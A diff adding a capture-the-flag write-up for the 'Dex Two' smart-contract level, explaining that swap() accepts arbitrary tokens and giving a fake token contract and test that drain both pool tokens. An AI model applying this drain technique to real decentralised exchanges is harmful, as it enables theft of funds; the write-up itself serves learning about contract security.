@@ -1526,3 +1526,57 @@ With `min()` and `swapAddresses()` convenience functions.
 * https://eips.ethereum.org/EIPS/eip-20
 * https://docs.openzeppelin.com/contracts/4.x/erc20
 * https://github.com/OpenZeppelin/openzeppelin-contracts/blob/f8e3c375d19bd12f54222109dd0801c0e0b60dd2/contracts/token/ERC20/IERC20.sol
+
+## 23 Dex Two
+
+To beat this level, we need to comply with
+
+```solidity
+IERC20(token1).balanceOf(_instance) == 0 && ERC20(token2).balanceOf(_instance) == 0
+```
+
+### Solution
+
+Looks very similar to [the Dex level](#22-dex). Notice, however the absence of this control from the former challenge in the `swap()` function:
+
+```solidity
+require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
+```
+
+In other words, we could use tokens not set into the Dex to engage in swapping:
+
+The design of the `MyToken` contract could be
+
+```solidity
+contract MyToken {
+  function transferFrom(address, address, uint256) public pure returns (bool) {
+    // we don't even need to do anything here
+    return false;
+  }
+
+  function balanceOf(address) public pure returns(uint256) {
+    // the dex will ask for IERC20(from).balanceOf(address(this))
+    // we give them the value `1`
+    // the dex uses it to compute the swap amount = amount * token_to / token_from
+    return 1;
+  }
+}
+```
+
+And the attack to be
+
+
+```solidity
+function testExploit() public {
+  // will get as token amount 1 * (100/ 1) = 100 on each swap
+  dex.swap(address(myToken), dex.token1(), 1);
+  dex.swap(address(myToken), dex.token2(), 1);
+  utils.submitLevelInstance(challengeAddress);
+}
+```
+
+### References
+
+* https://eips.ethereum.org/EIPS/eip-20
+* https://docs.openzeppelin.com/contracts/4.x/erc20
+* https://github.com/OpenZeppelin/openzeppelin-contracts/blob/f8e3c375d19bd12f54222109dd0801c0e0b60dd2/contracts/token/ERC20/IERC20.sol
